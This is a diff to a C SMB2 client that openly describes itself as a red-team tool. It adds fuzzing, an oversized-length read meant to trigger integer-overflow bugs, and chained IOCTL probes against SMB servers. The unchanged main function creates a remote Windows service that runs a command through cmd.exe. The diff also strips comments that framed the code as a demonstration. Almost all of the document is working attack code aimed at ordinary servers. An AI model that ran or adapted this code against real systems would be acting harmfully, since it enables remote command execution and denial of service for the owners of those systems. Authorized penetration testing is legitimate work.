@@ -10,7 +10,9 @@
    - Potential buffer overflows if server returns more data than expected.
    - No authentication handling; an attacker could hijack or tamper with session if not using SMB signing.
    - Possible integer overflows in length calculations if malicious server manipulates fields.
-   - Code is for authorized security testing; unauthorized use is prohibited. */
+   - Code is for authorized security testing; unauthorized use is prohibited.
+   - Added fuzzing and targeted packet patterns can induce crashes or reveal vulnerabilities.
+   - Additional IOCTL and trans operations might bypass certain defenses if unpatched. */
 
 #pragma pack(push, 1)
 
@@ -37,7 +39,7 @@ typedef struct _SMB2Header {
 #define SMB2_CLOSE           0x0006
 #define SMB2_READ            0x0008
 #define SMB2_WRITE           0x0009
-#define SMB2_IOCTL           0x000B  /* Added for SMB2 IOCTL demonstration */
+#define SMB2_IOCTL           0x000B
 
 #define STATUS_SUCCESS                0x00000000
 #define STATUS_INVALID_PARAMETER      0xC000000D
@@ -609,7 +611,6 @@ int doSRVSVCNetShareEnum() {
     return doWritePipe(dceRequest, idx);
 }
 
-/* Additional function: doIOCTL to demonstrate SMB2 IOCTL usage (can be used in various red-team scenarios) */
 int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
     SMB2Header hdr;
     buildSMB2Header(SMB2_IOCTL, gTreeId, gSessionId, &hdr);
@@ -650,6 +651,70 @@ int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
     printf("[Client] SMB2 IOCTL call successful.\n");
     return 0;
 }
+
+/* Extra red-team capabilities begin here */
+
+/* Sends a fuzzing payload that could reveal memory leaks or trigger crashes in unpatched servers. */
+int doFuzzSMB2(size_t fuzzCount) {
+    SMB2Header hdr;
+    unsigned char fuzzData[256];
+    memset(fuzzData, 0x41, sizeof(fuzzData));
+    for (size_t i = 0; i < fuzzCount; i++) {
+        buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
+        if (sendSMB2Request(&hdr, fuzzData, sizeof(fuzzData)) < 0) {
+            fprintf(stderr, "Fuzz iteration %zu failed.\n", i);
+            return -1;
+        }
+        SMB2Header respHdr;
+        unsigned char buf[512];
+        ssize_t payloadLen;
+        if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+            fprintf(stderr, "Fuzz response read failed.\n");
+            return -1;
+        }
+    }
+    printf("[Client] SMB2 fuzzing test done.\n");
+    return 0;
+}
+
+/* Attempts large read to detect if server handles huge lengths, may identify integer overflow issues. */
+int doLargeReadTest() {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
+    SMB2ReadRequest rreq;
+    memset(&rreq, 0, sizeof(rreq));
+    rreq.StructureSize    = 49;
+    rreq.Length           = 0xFFFFFFFF; 
+    rreq.FileIdPersistent = gPipeFidPersistent;
+    rreq.FileIdVolatile   = gPipeFidVolatile;
+    if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
+    SMB2Header respHdr;
+    unsigned char buf[4096];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status == STATUS_SUCCESS) {
+        printf("[Client] Large Read might indicate vulnerability.\n");
+    } else {
+        printf("[Client] Large Read test responded status=0x%08X.\n", respHdr.Status);
+    }
+    return 0;
+}
+
+/* Attempts multiple IOCTL calls that might chain to reveal logic flaws in server. */
+int doChainedIOCTLTests() {
+    unsigned char exampleData[8];
+    memset(exampleData, 0x42, sizeof(exampleData));
+    for (int i = 0; i < 5; i++) {
+        uint32_t ctl = 0x0011C000 + i;
+        if (doIOCTL(ctl, exampleData, sizeof(exampleData)) < 0) {
+            fprintf(stderr, "Chained IOCTL 0x%08X failed.\n", ctl);
+        }
+    }
+    printf("[Client] Chained IOCTL tests completed.\n");
+    return 0;
+}
+
+/* End of extra red-team capabilities */
 
 int main(int argc, char *argv[]) {
     if (argc < 3) {
@@ -702,6 +767,7 @@ int main(int argc, char *argv[]) {
         close(gSock);
         return EXIT_FAILURE;
     }
+
     if (doDCERPCBind() < 0) {
         fprintf(stderr, "DCERPC bind stub failed.\n");
     }
@@ -709,7 +775,6 @@ int main(int argc, char *argv[]) {
     doSVCCTLCreateService("TestSvc", "C:\\Windows\\System32\\cmd.exe /c calc.exe");
     doSRVSVCNetShareEnum();
 
-    /* Example IOCTL usage with no real data, can be extended for advanced attacks. */
     unsigned char dummyIoctlData[] = { 0x01, 0x02, 0x03, 0x04 };
     doIOCTL(0x0011C017, dummyIoctlData, sizeof(dummyIoctlData));
 
@@ -729,6 +794,11 @@ int main(int argc, char *argv[]) {
             printf("[Client] No data returned from pipe.\n");
         }
     }
+
+    /* Call enhanced red-team functions */
+    doFuzzSMB2(5);
+    doLargeReadTest();
+    doChainedIOCTLTests();
 
     if (doClosePipe() < 0) {
         fprintf(stderr, "Failed to close pipe properly.\n");
